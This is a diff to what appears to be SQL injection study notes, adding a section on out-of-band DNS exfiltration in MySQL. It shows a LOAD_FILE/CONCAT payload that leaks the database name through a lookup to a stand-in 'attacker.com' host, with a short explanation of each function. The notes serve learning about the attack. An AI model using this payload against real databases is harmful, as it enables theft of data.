@@ -251,7 +251,17 @@ Use if everything else if failed and firewall is not blocking outband connection
 
 Less used compared to the in-band or blind.
 
-## How it works.
+### How it works.
 
 Attack Channel => web request with injection payload
 Data Channel => outband request that the database makes to your server, with the exfiltrated data.
+
+### DNS Exfiltration with MySQL
+
+Uses LOAD_FILE() to trigger DNS lookup.
+
+`SELECT LOAD_FILE(CONCAT('\\\\'(SELECT database()) '.attacker.com\\share'));`
+
+`SELECT database()` => pulls database name
+`CONCAT()` => builds string
+`LOAD_FILE()` => reading the file path
